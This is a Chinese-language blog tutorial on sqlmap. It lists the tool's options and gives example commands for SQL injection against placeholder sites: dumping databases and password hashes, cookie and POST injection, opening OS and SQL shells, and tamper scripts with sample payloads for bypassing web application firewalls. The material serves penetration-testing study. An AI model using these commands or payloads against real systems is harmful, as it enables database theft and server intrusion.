    <content type="html"><![CDATA[<h2 id="0x00-安装"><a href="#0x00-安装" class="headerlink" title="0x00 安装"></a>0x00 安装</h2><p>git clone <a href="https://github.com/sqlmapproject/sqlmap.git" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap.git</a></p><h2 id="0x01-基本用法"><a href="#0x01-基本用法" class="headerlink" title="0x01 基本用法"></a>0x01 基本用法</h2><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-dbs       <span class="string">//</span>列举数据库</span><br><span class="line"><span class="params">--count</span> -D “数据库”   <span class="string">//</span>获取表中数据个数</span><br><span class="line"><span class="params">--current-db</span>           <span class="string">//</span>列举当前数据库</span><br><span class="line"><span class="params">--users</span> <span class="params">--passwords</span>              <span class="string">//</span>列举数据库用户名</span><br><span class="line"><span class="params">--current-user</span>               <span class="string">//</span>列举当前用户</span><br><span class="line"><span class="params">--privileges</span>               <span class="string">//</span>查看权限</span><br><span class="line"><span class="params">--os-shell</span>                    <span class="string">//</span>写web shell</span><br><span class="line"><span class="params">--is-dba</span>                    <span class="string">//</span>判断当前用户是不是dba</span><br><span class="line"><span class="params">--tables</span> -D <span class="string">"数据库"</span>          <span class="string">//</span>列举数据库的表名</span><br><span class="line"><span class="params">--columns</span> -T <span class="string">"表名"</span> -D <span class="string">"数据库"</span>       <span class="string">//</span> 列举列名</span><br><span class="line"><span class="params">--dump</span> -C <span class="string">"列名"</span> -T <span class="string">"表名"</span> -D <span class="string">"数据库"</span>           <span class="string">//</span>列举数据</span><br><span class="line"><span class="params">--start=</span>：指定开始的行</span><br><span class="line"><span class="params">--stop=</span>：指定结束的行</span><br><span class="line"><span class="params">--threads=</span>:线程数</span><br><span class="line"></span><br><span class="line">存储数据在 <span class="string">./sqlmap/output/.......</span></span><br><span class="line">-f <span class="params">--banner</span> <span class="params">--dbs</span> <span class="params">--users</span> <span class="params">--batch</span> <span class="params">--crawl=3</span></span><br><span class="line">当<span class="params">--level</span>为2以上，会尝试注入cookie</span><br><span class="line">当<span class="params">--level</span>为3以上，会尝试注入user-agent、referer</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">获取目标方式</span><br><span class="line">     -<span class="ruby">u          /<span class="regexp">/指定目标</span></span></span><br><span class="line"><span class="ruby">     -l        /<span class="regexp">/从burp或webscarab代理中获取日志</span></span></span><br><span class="line"><span class="ruby">     -m     /<span class="regexp">/ 从文本中获取多个目标扫描</span></span></span><br><span class="line"><span class="ruby">     -r      /<span class="regexp">/从文件中加载http请求</span></span></span><br><span class="line"><span class="ruby">     -g      /<span class="regexp">/处理google的搜索结果 inurl:\".php?id=1\"       --smart</span></span></span><br><span class="line"><span class="ruby">请求</span></span><br><span class="line"><span class="ruby">     --data     /<span class="regexp">/把数据以post方式提交</span></span></span><br><span class="line"><span class="ruby">     --param-del     /<span class="regexp">/当get或post的数据需要用其他字符分割时    --data="id=1;id=2" --param-del=";"</span></span></span><br><span class="line"><span class="ruby">     --cookie     /<span class="regexp">/http cookie头</span></span></span><br><span class="line"><span class="ruby">     --drop-set-cookie     /<span class="regexp">/拒绝cookie</span></span></span><br><span class="line"><span class="ruby">     --user-agent</span></span><br><span class="line"><span class="ruby">     --random-agent     /<span class="regexp">/修改user-agent参数</span></span></span><br><span class="line"><span class="ruby">     --referer      /<span class="regexp">/伪造referer</span></span></span><br><span class="line"><span class="ruby">     --headers      /<span class="regexp">/增加额外的http头</span></span></span><br><span class="line"><span class="ruby">     --auth-type,--auth-cred      /<span class="regexp">/http认证保护 --auth-type Basic(Basic、Digest、NTLM) --auth-cred "testuser:testpass"</span></span></span><br><span class="line"><span class="ruby">     --auth-cert     /<span class="regexp">/http协议的证书认证</span></span></span><br><span class="line"><span class="ruby">     --proxy     /<span class="regexp">/http代理</span></span></span><br><span class="line"><span class="ruby">     --proxy-cred</span></span><br><span class="line"><span class="ruby">     --ignore-proxy      /<span class="regexp">/拒绝使用本地局域网代理</span></span></span><br><span class="line"><span class="ruby">     --delay      /<span class="regexp">/设定两个请求件的延迟，默认0s</span></span></span><br><span class="line"><span class="ruby">     --timeout     /<span class="regexp">/请求超时判断，默认30s</span></span></span><br><span class="line"><span class="ruby">     --retries     /<span class="regexp">/当超时是，重试次数，默认3次</span></span></span><br><span class="line"><span class="ruby">     --randomize     /<span class="regexp">/使参数值随机改变，长度类型不变</span></span></span><br><span class="line"><span class="ruby">     --scope     /<span class="regexp">/使用正则过滤目标网址，例如：python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"</span></span></span><br><span class="line"><span class="ruby">     --safe-url,--safe-freq     /<span class="regexp">/避免过多错误请求被屏蔽</span></span></span><br><span class="line"><span class="ruby">     --skip-urlencode     /<span class="regexp">/关闭URL参数值编码</span></span></span><br><span class="line"><span class="ruby">     --eval     /<span class="regexp">/执行自定义的python代码</span></span></span><br><span class="line"><span class="ruby">注入</span></span><br><span class="line"><span class="ruby">     -p     /<span class="regexp">/设定想要测试的参数</span></span></span><br><span class="line"><span class="ruby">     --skip     /<span class="regexp">/设定不要测试的参数</span></span></span><br><span class="line"><span class="ruby">     --dbms      /<span class="regexp">/指定数据库</span></span></span><br><span class="line"><span class="ruby">     --os      /<span class="regexp">/指定数据库服务器的系统     </span></span></span><br><span class="line"><span class="ruby">     --invalid-bignum     /<span class="regexp">/指定无效的大数字， 默认情况下id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。</span></span></span><br><span class="line"><span class="ruby">     --invalid-logical     /<span class="regexp">/指定无效的逻辑， 可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19</span></span></span><br><span class="line"><span class="ruby">     --tamper     /<span class="regexp">/修改注入的数据，查看 ./tamper</span><span class="regexp">/ 可用脚本</span></span></span><br><span class="line"><span class="ruby">探测</span></span><br><span class="line"><span class="ruby">     --level     /<span class="regexp">/探测等级</span></span></span><br><span class="line"><span class="ruby">     --risk      /<span class="regexp">/风险等级 ，在./xml</span><span class="regexp">/payloads.xml/</span>中</span></span><br><span class="line"><span class="ruby">     --string     /<span class="regexp">/页面比较， 用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在，添加字符串     </span></span></span><br><span class="line"><span class="ruby">     --regexp     /<span class="regexp">/页面比较，添加正则</span></span></span><br><span class="line"><span class="ruby">     --<span class="keyword">not</span>-string     /<span class="regexp">/页面比较， 用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串</span></span></span><br><span class="line"><span class="ruby">     --code     /<span class="regexp">/页面比较， 用户也可以提供真与假条件返回的HTTP状态码不一样来注入</span></span></span><br><span class="line"><span class="ruby">     --text-only     /<span class="regexp">/页面比较， 用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用，http响应体不同</span></span></span><br><span class="line"><span class="ruby">     --titles     /<span class="regexp">/页面比较，html的title标签中不同</span></span></span><br><span class="line"><span class="ruby">注入技术     </span></span><br><span class="line"><span class="ruby">     --technique     /<span class="regexp">/测试是否是注入，指定使用的探测技术，默认会测试所有的方式（B/</span>E/U/S/T）</span></span><br><span class="line"><span class="ruby">     --time-sec     /<span class="regexp">/设定延迟注入的时间，默认5s</span></span></span><br><span class="line"><span class="ruby">     --union-cols     /<span class="regexp">/设定union查询的字段数，默认1-10个字段数</span></span></span><br><span class="line"><span class="ruby">     --union-char     /<span class="regexp">/设定union查询使用的字符</span></span></span><br><span class="line"><span class="ruby">     --second-order     /<span class="regexp">/二阶sql注入， 有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。 --second-order后面跟一个判断页面的URL地址。</span></span></span><br><span class="line"><span class="ruby">列数据</span></span><br><span class="line"><span class="ruby">     -b,--banner     /<span class="regexp">/标志，返回数据库的版本号</span></span></span><br><span class="line"><span class="ruby">     --current-db     /<span class="regexp">/返回当前链接的数据库</span></span></span><br><span class="line"><span class="ruby">     --is-dba     /<span class="regexp">/判断当前用户是否为管理</span></span></span><br><span class="line"><span class="ruby">     --users     /<span class="regexp">/列数据库管理用户</span></span></span><br><span class="line"><span class="ruby">     --passwords     /<span class="regexp">/列出用户和用户的hash，并尝试破解</span></span></span><br><span class="line"><span class="ruby">     --privileges     /<span class="regexp">/列出数据库管理员权限</span></span></span><br><span class="line"><span class="ruby">     --roles     /<span class="regexp">/勒出数据库管理员角色，仅适用于Oracle</span></span></span><br><span class="line"><span class="ruby">     --dbs     /<span class="regexp">/列出数据库系统的数据库</span></span></span><br><span class="line"><span class="ruby">     --tables     /<span class="regexp">/列举数据库表，--exclude-sysdbs指不包含了所有的系统数据库，-D指定数据库</span></span></span><br><span class="line"><span class="ruby">     --columns     /<span class="regexp">/列出指定数据库表中的字段和数据类型，-D 指定数据库，-T 指定表</span></span></span><br><span class="line"><span class="ruby">     --schema     /<span class="regexp">/列举数据库系统的架构， 包含所有的数据库，表和字段，以及各自的类型。 --exclude-sysdbs参数，将不会获取数据库自带的系统库内容。</span></span></span><br><span class="line"><span class="ruby">     --count     /<span class="regexp">/获取表中数据个数</span></span></span><br><span class="line"><span class="ruby">     --dump      /<span class="regexp">/获取整个表的数据，-D-T指定要获取哪个库哪个表，--start,--stop,--first,--last</span></span></span><br><span class="line"><span class="ruby">     --dump-all     /<span class="regexp">/获取所有数据库表的内容， 加上--exclude-sysdbs只获取用户数据库的表，/</span>*脱裤啊*<span class="regexp">/</span></span></span><br><span class="line"><span class="ruby">     --search     /<span class="regexp">/搜索-C列名，-T表，-D数据库</span></span></span><br><span class="line"><span class="ruby">     --sql-query,--sql-shell     /<span class="regexp">/运行自定义sql语句</span></span></span><br><span class="line"><span class="ruby">爆破</span></span><br><span class="line"><span class="ruby">     --common-tables     /<span class="regexp">/暴力破解表名  </span></span></span><br><span class="line"><span class="ruby">     --common-columns     /<span class="regexp">/暴力破解列名</span></span></span><br><span class="line"><span class="ruby">用户自定义函数注入</span></span><br><span class="line"><span class="ruby">     --udf-inject,--shared-lib     </span></span><br><span class="line"><span class="ruby">系统文件操作</span></span><br><span class="line"><span class="ruby">     --file-read     /<span class="regexp">/从数据库服务器中读取文件</span></span></span><br><span class="line"><span class="ruby">     --file-write,--file-dest     /<span class="regexp">/把文件上传到数据库服务器中</span></span></span><br><span class="line"><span class="ruby">     --os-cmd,--os-shell     /<span class="regexp">/运行任意操作系统命令</span></span></span><br><span class="line"><span class="ruby">Meterpreter配合使用</span></span><br><span class="line"><span class="ruby">     --os-pwn --msf-path /software/metasploit</span></span><br><span class="line"><span class="ruby">     --os-smbrelay     /<span class="regexp">/通过smb攻击</span></span></span><br><span class="line"><span class="ruby">     --os-bof     /<span class="regexp">/通过溢出</span></span></span><br><span class="line"><span class="ruby">     --tmp-path</span></span><br><span class="line"><span class="ruby">     --priv-esc</span></span><br><span class="line"><span class="ruby">对Windows注册表操作</span></span><br><span class="line"><span class="ruby">     --reg-read     /<span class="regexp">/读取注册表</span></span></span><br><span class="line"><span class="ruby">     --reg-add     /<span class="regexp">/写入</span></span></span><br><span class="line"><span class="ruby">     --reg-del     /<span class="regexp">/删除</span></span></span><br><span class="line"><span class="ruby">     --reg-key,--reg-value,--reg-data,--reg-type     /<span class="regexp">/辅助选项</span></span></span><br><span class="line"><span class="ruby">常规参数</span></span><br><span class="line"><span class="ruby">     -s     /<span class="regexp">/从sqlit中读取session， sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数</span></span></span><br><span class="line"><span class="ruby">     -t     /<span class="regexp">/保存http日志，需要跟一个文本文件</span></span></span><br><span class="line"><span class="ruby">     --batch     /<span class="regexp">/非交互模式，使用默认值一直运行下去</span></span></span><br><span class="line"><span class="ruby">     --charset=     <span class="regexp">//</span>强制使用字符编码</span></span><br><span class="line"><span class="ruby">     --crawl=    <span class="regexp">//</span>爬行网站URL,后面跟深度，收集潜在的可能存在漏洞的链接</span></span><br><span class="line"><span class="ruby">     --csv-del=<span class="string">";"</span>     /<span class="regexp">/规定输出到csv中的分隔符，默认逗号</span></span></span><br><span class="line"><span class="ruby">     --dbms-cred     /<span class="regexp">/dbms身份验证 某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数。</span></span></span><br><span class="line"><span class="ruby">     --dump-format     /<span class="regexp">/定义dump数据的格式（ CSV，HTML，SQLITE ）</span></span></span><br><span class="line"><span class="ruby">     --eta     /<span class="regexp">/预估完成时间</span></span></span><br><span class="line"><span class="ruby">     --flush-session     /<span class="regexp">/刷新session文件</span></span></span><br><span class="line"><span class="ruby">     --forms     /<span class="regexp">/自动获取form表单测试</span></span></span><br><span class="line"><span class="ruby">     --fresh-queries     /<span class="regexp">/忽略在回话文件中存储的查询结果</span></span></span><br><span class="line"><span class="ruby">     --hex     /<span class="regexp">/使用DBMS的hex函数， 有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免</span></span></span><br><span class="line"><span class="ruby">     --output-dir=    <span class="regexp">//</span>自定义输出的路径</span></span><br><span class="line"><span class="ruby">     --parse-errors     /<span class="regexp">/从响应中获取DBMS的错误信息</span></span></span><br><span class="line"><span class="ruby">其他参数缩写</span></span><br><span class="line"><span class="ruby">     -z     /<span class="regexp">/使用参数缩写，--batch --random-agent --ignore-proxy --technique=BEU -u，可以写成-z "bat,randoma,ign,tec=BEU" -u，还有--ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u，可以写成-z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u</span></span></span><br><span class="line"><span class="ruby">     --alert     /<span class="regexp">/成功注入时警告，</span></span></span><br><span class="line"><span class="ruby">     --answers=      <span class="regexp">//</span>设定会发的答案, 当sqlmap提出输入时，自动输入自己想要的答案可以使用此参数</span></span><br><span class="line"><span class="ruby">     --beep     /<span class="regexp">/发现sql注入时发出蜂鸣声</span></span></span><br><span class="line"><span class="ruby">     --check-waf     /<span class="regexp">/启发式检测WAF/</span>IPS/IDS保护， 使用一个不存在的参数来注入测试</span></span><br><span class="line"><span class="ruby">     --cleanup     /<span class="regexp">/清理sqlmap注入时产生的UDF(s)和表</span></span></span><br><span class="line"><span class="ruby">     --disable-coloring     /<span class="regexp">/禁止彩色输出</span></span></span><br><span class="line"><span class="ruby">     --gpage     /<span class="regexp">/使用指定的Google结果页面</span></span></span><br><span class="line"><span class="ruby">     --hpp     /<span class="regexp">/使用http参数污染， 可能会绕过WAF/</span>IPS/IDS保护机制，这个对ASP/IIS与ASP.NET/IIS平台很有效</span></span><br><span class="line"><span class="ruby">     --identify-waf     /<span class="regexp">/测试WAF/</span>IPS/IDS保护</span></span><br><span class="line"><span class="ruby">     --mobile     /<span class="regexp">/模仿智能手机</span></span></span><br><span class="line"><span class="ruby">     --purgr-output     /<span class="regexp">/安全的删除output目录的文件</span></span></span><br><span class="line"><span class="ruby">     --smart     /<span class="regexp">/启发式判断注入， 对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入</span></span></span><br><span class="line"><span class="ruby">     --wizard     /<span class="regexp">/初级用户向导参数，可以一步一步教你如何输入针对目标注入</span></span></span><br></pre></td></tr></table></figure><h2 id="0x02-例子"><a href="#0x02-例子" class="headerlink" title="0x02 例子"></a>0x02 例子</h2><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> <span class="comment">//查是否有注入，一些基本信息</span></span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --dbs <span class="comment">//枚举数据库</span></span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --tables -D 数据库名 <span class="comment">//表名枚举</span></span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --<span class="attribute">columns</span> -D 数据库名 -T 数据库表名 //字段枚举</span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --dump -D 数据库名 -T 表名 -C <span class="string">"字段名1，字段名2，字段名3"</span> <span class="comment">//dump</span></span><br></pre></td></tr></table></figure><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>cookie注入常见有两种，一种是cookie中的值拼接成sql语句产生注入<br>另一种asp的cookie中转注入，原因是程序对提交数据获取方式是直接request(“c.s.t”)的方式.未指明使用request对象的具体方法进行获取。可以都接收get,post,cookie方式提交的数据，一般程序只是过滤了get和post注入，如果没有过滤cookie注入语句，我们就可以进行注入了。</p><p>这里对第二种进行简单判断是否存在cookie注入的可能，</p><ol><li>首先要访问正常的页面，即是：<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> /test.asp?id=1，等页面打开之后，我们将IE地址栏清空，然后写 上:<code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;1&quot;));</code> 这里的“id=”便是“test.asp?id=1”中的“id=”，“escape(“1”)”中的“1”是 “test.asp?id=1”中的“id=1”了，这两处要根据实际情`况来定义。之后按下回车网页中会弹出一个对话框。</li><li>更改好了cookie后，我们就要试下能不能正常访问了，在另外一个窗口中我们打开以下地址：<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> /test.asp? 既是将“id=1”去掉后的，然后看是否能正常访问。<br>如果可以正常显示，那么就是以request(“c.s.t”)方式获取数据的，一般只是过滤了get和post注入，如果没有过滤cookie注入语句，我们就可以进行注入了。</li><li>通过修改escape中的参数来判断是否存在注入，接下来和普通注入判断方式一样</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --level <span class="number">2</span> 枚举强度</span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --cookie <span class="string">"id=1"</span></span><br></pre></td></tr></table></figure><h3 id="表单post"><a href="#表单post" class="headerlink" title="表单post"></a>表单post</h3><p>三种方式</p><ol><li><p>表单枚举<br> <code>python sqlmap.py -u &quot;http://www.xxx.com&quot; --forms</code></p></li><li><p>指定post参数<br> <code>python sqlmap.py -u &quot;http://www.xxx.com&quot; --data &quot;username=1&amp;passwd=1&quot;</code></p></li><li><p>抓包构造<br> <code>python sqlmap.py -r test.txt</code></p></li></ol><h3 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h3><p>简单判断伪静态<br>浏览器F12开发者工具控制台<br><code>alert(document.lastModified)</code><br>会弹出网页最后更新时间，多次刷新页面，通过时间判断出是否为静态页面</p><p><code>python sqlmap.py -u &quot;http://www.xxx.com/index.php/Index/id/1*.html&quot;</code></p><h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-cmd <span class="string">"ipconfig"</span></span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-<span class="keyword">shell</span></span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-pwn</span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --sql-<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><h2 id="0x03-Tamper使用"><a href="#0x03-Tamper使用" class="headerlink" title="0x03 Tamper使用"></a>0x03 Tamper使用</h2><p><code>python sqlmap.py -u &quot;http://www.xxx.com&quot; -v 3 --dbs --batch --tamper &quot;space2hash.py&quot;</code></p><p>常见waf绕过脚本encoder: space2hash.py, space2morehash.py, base64encode.py, charencode.py</p><p><strong>tamper WAF 绕过脚本列表注释</strong></p><ol><li>apostrophemask.py 用UTF-8全角字符替换单引号字符</li><li>apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</li><li>appendnullbyte.py 在payload末尾添加空字符编码</li><li>base64encode.py 对给定的payload全部字符使用Base64编码</li><li>between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</li><li>bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</li><li>chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</li><li>charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</li><li>charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</li><li>concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</li><li>equaltolike.py 用“LIKE”运算符替换全部等于号“=”</li><li>greatest.py 用“GREATEST”函数替换大于号“&gt;”</li><li>halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</li><li>ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</li><li>lowercase.py 用小写值替换每个关键字字符</li><li>modsecurityversioned.py 用注释包围完整的查询</li><li>modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</li><li>multiplespaces.py 在SQL关键字周围添加多个空格</li><li>nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</li><li>overlongutf8.py 转换给定的payload当中的所有字符</li><li>percentage.py 在每个字符之前添加一个百分号</li><li>randomcase.py 随机转换每个关键字字符的大小写</li><li>randomcomments.py 向SQL关键字中插入随机注释</li><li>securesphere.py 添加经过特殊构造的字符串</li><li>sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</li><li>space2comment.py 用“/**/”替换空格符</li><li>space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</li><li>space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</li><li>space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</li><li>space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li><li>space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</li><li>space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li><li>space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符</li><li>space2plus.py 用加号“+”替换空格符</li><li>space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li><li>unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</li><li>unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</li><li>varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</li><li>versionedkeywords.py 用MySQL注释包围每个非函数关键字</li><li>versionedmorekeywords.py 用MySQL注释包围每个关键字</li><li>xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>PS：工具既然叫做工具，就是用来辅助上单的，呸辅助我们完成某些任务的，仅仅适用于当进行某些重复的繁琐工作或是偶尔懒癌发作时，不能过度依赖</p><p><strong>ALL 表示所有数据库都适用，具体指出哪种数据库就表名只只适用于某些数据。</strong></p><p>使用方法： </p><pre><code>sqlmap.py XXXXX -tamper &quot;模块名&quot;</code></pre><p>各个 tamper 的作用 </p><p>下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p><p>apostrophemask.py: </p><pre><code>return payload.replace(&apos;\&apos;&apos;, &quot;%EF%BC%87&quot;) if payload else payload</code></pre><p>将单引号 url 编码，用于过滤了单引号的情况。</p><pre><code>1&apos; AND &apos;1&apos;=&apos;1  to 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</code></pre><p><strong>适用数据库：</strong>ALL</p><p>apostrophenullencode.py: </p><pre><code>return payload.replace(&apos;\&apos;&apos;, &quot;%00%27&quot;) if payload else payload</code></pre><p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p><pre><code>1&apos; AND &apos;1&apos;=&apos;1 to 1�&apos; AND �&apos;1�&apos;=�&apos;1</code></pre><p><strong>适用数据库：</strong>ALL</p><p>appendnullbyte.py: </p><pre><code>return &quot;%s%%00&quot; % payload if payload else payload</code></pre><p>在你构造的payload后面加一个空字符</p><pre><code>1&apos; AND &apos;1&apos;=&apos;1to1&apos; AND &apos;1&apos;=&apos;1[]</code></pre><p><strong>适用数据库：</strong>Access</p><p>base64encode.py: </p><pre><code>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</code></pre><p>这个看模块名也知道是 base64 编码</p><pre><code>1&apos; AND &apos;1&apos;=&apos;1 toMScgQU5EICcxJz0nMQ==</code></pre><p><strong>适用数据库：</strong>ALL</p><p>between.py: </p><p>这个代码有点长，就不贴代码了，可以自己去查看：C:\Python\SQLMap\tamper\between.py</p><p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p><pre><code>1 AND A &gt; Bto1 AND A NOT BETWEEN 0 AND B1 AND A = Bto1 AND A BETWEEN B AND B</code></pre><p><strong>适用数据库：</strong>ALL</p><p>bluecoat.py: </p><p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p><pre><code>union select * from users where id = 1tounion%09select * from%09users where id like 1</code></pre><p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p><p>chardoubleencode.py: </p><p>用 url 编码两次你的 payload </p><pre><code>select * from usersto%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</code></pre><p><strong>适用数据库：</strong>ALL</p><p>charencode.py: </p><p>用 url 编码一次你的 payload</p><pre><code>select * from usersto%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</code></pre><p><strong>适用数据库：</strong>ALL</p><p>charunicodeencode.py： </p><p>用 unicode 编码 payload 